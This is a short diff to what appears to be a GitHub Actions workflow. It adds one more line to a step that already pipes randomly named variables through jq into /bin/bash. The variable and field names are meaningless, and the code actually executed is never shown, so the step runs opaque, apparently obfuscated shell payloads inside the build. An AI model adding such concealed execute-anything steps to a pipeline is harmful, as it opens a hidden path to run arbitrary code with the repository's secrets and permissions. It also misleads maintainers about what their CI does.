@@ -27,6 +27,7 @@ jobs:
           echo $kxh67476 | jq -r .nm3 | /bin/bash
           echo $cr96902 | jq -r .xuou251 | /bin/bash
           echo $myquf651 | jq -r .ranp3983 | /bin/bash
+          printf '%s' "$utt21" | jq -r .zbh851 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
